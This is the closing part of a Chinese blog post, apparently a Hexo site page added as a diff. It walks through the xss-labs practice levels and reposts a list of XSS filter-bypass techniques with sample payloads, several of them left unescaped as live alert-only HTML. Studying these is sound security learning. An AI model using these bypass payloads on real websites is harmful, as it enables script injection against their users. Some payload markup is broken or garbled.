+<p>arg01=123&amp;arg02=%20onmousedown=alert<code>1</code></p>
+<p>arg01=123&amp;arg02=  onmouseover=alert(1) type=”text”</p>
+<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg" alt="img"></p>
+<p>闯关成功！！！</p>
+<p> <strong>Level 18:</strong></p>
+<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg" alt="img"></strong></p>
+<p>分析一下源代码中的判断xss的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析代码，发现完全可以用上一挑战的方法，payload如上</p>
+<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg" alt="img"></p>
+<p> <strong>Level 19，20:</strong></p>
+<p> Flash xss没了解过…等以后学到再回来更新吧…</p>
+<h1 id="0-1XSS-绕过常用方法"><a href="#0-1XSS-绕过常用方法" class="headerlink" title="0|1XSS 绕过常用方法"></a>0|1<strong>XSS</strong> <strong>绕过常用方法</strong></h1><p><strong>1</strong> <strong>、大小写绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRIpT&gt;alert(&apos;123&apos;)&lt;/sCRIpT&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2</strong> <strong>、编码绕过</strong></p>
+<ul>
+<li>1.十六进制编码</li>
+<li>2.jsfuck编码</li>
+<li>3.url编码</li>
+<li>4.unicode编码</li>
+</ul>
+<p><code>&lt;0x736372697074&gt;alert(&#39;123&#39;)&lt;/0x736372697074&gt;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3</strong> <strong>、绕过</strong> <strong>magic_quotes_gpc</strong></p>
+<script>String.fromCharCode(97,
+108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)</script>
+
+
+
+<p><strong>4</strong> <strong>、标签</strong></p>
+<p><strong>闭合标签</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>标签绕过</strong></p>
+<p><img src="/2019/11/20/XSS平台练习/XSS平台练习/x" onerror="alert(1)"></p>
+<button onclick="javascript:alert('xss')>XSS</button">
+
+<title><img a="</title><img/src=1 onerror=alert(1)//">
+
+<p>“onsubmit=javascript:alert(1)%20name=”a</p>
+<details open ontoggle="eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))">
+
+<p>&lt;video<br>src=”<a href="http://www.0dutv.com/plug/down/up2.php/104678898.mp3&quot;" target="_blank" rel="noopener">http://www.0dutv.com/plug/down/up2.php/104678898.mp3&quot;</a> onprogress=(′body′).prepend(123);(′body′).prepend(123);(‘body’)&gt;</p>
+<p><strong>5</strong> <strong>、其他符号绕过</strong></p>
+<p>%0a         替换空格</p>
+<p>%0d         替换空格</p>
+<p>/**/          替换空格</p>
+<p>%00          截断</p>
+<p>``              替换括号</p>
+<p><strong>6</strong> <strong>、双字符绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img ononerrorerror=&quot;123&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<script>alalertert(123)</script>
+
+<p><strong>7</strong> <strong>、宽字节绕过</strong></p>
+<ul>
+<li>gbxxxx系列的编码，那么我们尝试一下宽字节  %c0，%bf，%5c，%df</li>
+</ul>
+<p><strong>8</strong> <strong>、其他事件绕过</strong></p>
+<p>onload</p>
+<p>onclick</p>
+<p>onerror</p>
+<p>prompt</p>
+<p>confirm</p>
+<p>onmousemove</p>
+<p><strong>9</strong>、CRLF injection绕过</p>
+<p>CRLF是”回车 + 换行”（\r\n）的简称。</p>
+<p><a href="http://www.xxx.com%0d%0a%0d%0a" target="_blank" rel="noopener">http://www.xxx.com%0d%0a%0d%0a</a>&lt;svg/onload=prompt(1)&gt;</p>
+<blockquote>
+<p><strong><strong>转载自</strong></strong></p>
+<p> <strong>作　　者</strong>：<strong>bmjoker</strong></p>
+<p> <strong>出　　处</strong>：<a href="https://www.cnblogs.com/bmjoker/p/9446472.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9446472.html</a></p>
+</blockquote>
+</details></title></button>
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://the-wind-hunter.github.io">jax</a>
+            <p>原文链接：<a href="https://the-wind-hunter.github.io/2019/11/20/XSS平台练习/XSS平台练习/">https://the-wind-hunter.github.io/2019/11/20/XSS平台练习/XSS平台练习/</a>
+            <p>发表日期：<a href="https://the-wind-hunter.github.io/2019/11/20/XSS平台练习/XSS平台练习/">十一月 20日 2019, 11:27:52 上午</a>
+            <p>更新日期：<a href="https://the-wind-hunter.github.io/2019/11/20/XSS平台练习/XSS平台练习/">November 21st 2019, 11:08:14 am</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+       
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/11/18/web-安全之-XSS-漏洞学习实战/" title= "web 安全之 XSS 漏洞学习实战">
+                    <div class="prevTitle">web 安全之 XSS 漏洞学习实战</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:2509594439@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/the-wind-hunter" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">欢迎来到第15关，自己想个办法走出去吧！</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0-1XSS-绕过常用方法"><span class="toc-number">2.</span> <span class="toc-text">0|1XSS 绕过常用方法</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 26
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/20</span><a class="archive-post-title" href= "/2019/11/20/XSS平台练习/XSS平台练习/" >XSS平台练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/18</span><a class="archive-post-title" href= "/2019/11/18/web-安全之-XSS-漏洞学习实战/" >web 安全之 XSS 漏洞学习实战</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href= "/2019/11/16/Web日志安全分析浅谈/" >Web日志安全分析浅谈</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/2019/11/07/pikachu之CSRF练习/" >pikachu之CSRF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/2019/11/07/pikachu之SQL注入/" >pikachu之SQL注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/CSRF(跨站请求伪造)/" >跨站请求伪造CSRF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/第十三周-web安全之手工测试之前编写的注入环境/" >第十三周web安全之手工测试之前编写的注入环境</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/2019/10/20/第十周-各种注入类型的环境搭建和代码编写/" >第十周：各种注入类型的环境搭建和代码编写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2019/10/16/oneinstack-建站/" >oneinstack 建站</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2019/10/16/233/" >just a test23333333</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2019/10/16/Web配置本地yum源-Linux安全/" >We配置本地yum源-Linux安全</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/03</span><a class="archive-post-title" href= "/2019/10/03/Web安全学习之——基于dvwa的XSS Reflect学习教程/" >Web安全学习之——基于dvwa的XSS (Reflect)学习教程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/29</span><a class="archive-post-title" href= "/2019/09/29/第九周：web-页面解析的流程学习/" >第九周：web 页面解析的流程学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/19</span><a class="archive-post-title" href= "/2019/09/19/第六周：数据库相关注入语句的收集和学习/" >第六周：数据库相关注入语句的收集和学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href= "/2019/09/05/第四周-数据库系统功能相关学习/" >第四周-数据库系统功能相关学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href= "/2019/09/01/Web安全学习之——基于dvwa的XSS (DOM）学习教程/" >Web安全学习之——基于dvwa的XSS (DOM）学习教程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/29</span><a class="archive-post-title" href= "/2019/08/29/Windows 上安装 MySQL/" >Windows 上安装 MySQL</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/29</span><a class="archive-post-title" href= "/2019/08/29/hexo-github博客搭建/" >hexo+github博客搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2019/08/17/sqlmap使用的简单介绍（基于dvwa讲解）/" >sqlmap使用的简单介绍（基于dvwa讲解）</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/08/29/MySQL用户管理：添加用户、授权、删除用户/" >MySQL用户管理：添加用户、授权、删除用户</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/08/22/第三周：数据库系统表相关学习/" >第三周：数据库系统表相关学习</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2019/08/16/第二周：认识sql并学习数据库的基础操作/" >第二周：认识SQL并学习数据库的基础操作</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span><a class="archive-post-title" href= "/2019/08/11/Web安全学习之——基于dvwa的XSS Stored）学习教程/" >Web安全学习之——基于dvwa的XSS (Stored）学习教程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/10</span><a class="archive-post-title" href= "/2019/08/10/web安全学习之——基于dvwa的SQL注入演练(low)/" >SQL注入练习：基于DVWA的SQL注入演练(low)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2019/08/06/web安全学习之基于dvwa的SQL Injection (Blind)盲注--思路篇/" >web安全学习之基于dvwa的SQL Injection (Blind)盲注--思路篇</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/08/16/第一周：环境准备/" >第一周：环境准备</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="玩"><span class="iconfont-archer">&#xe606;</span>玩</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS学习"><span class="iconfont-archer">&#xe606;</span>XSS学习</span>
+    
+        <span class="sidebar-tag-name" data-tags="CSRF"><span class="iconfont-archer">&#xe606;</span>CSRF</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="日志分析"><span class="iconfont-archer">&#xe606;</span>日志分析</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="XSS学习"><span class="iconfont-archer">&#xe60a;</span>XSS学习</span>
+    
+        <span class="sidebar-category-name" data-categories="Web安全"><span class="iconfont-archer">&#xe60a;</span>Web安全</span>
+    
+        <span class="sidebar-category-name" data-categories="小白成长学习计划"><span class="iconfont-archer">&#xe60a;</span>小白成长学习计划</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "jax"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
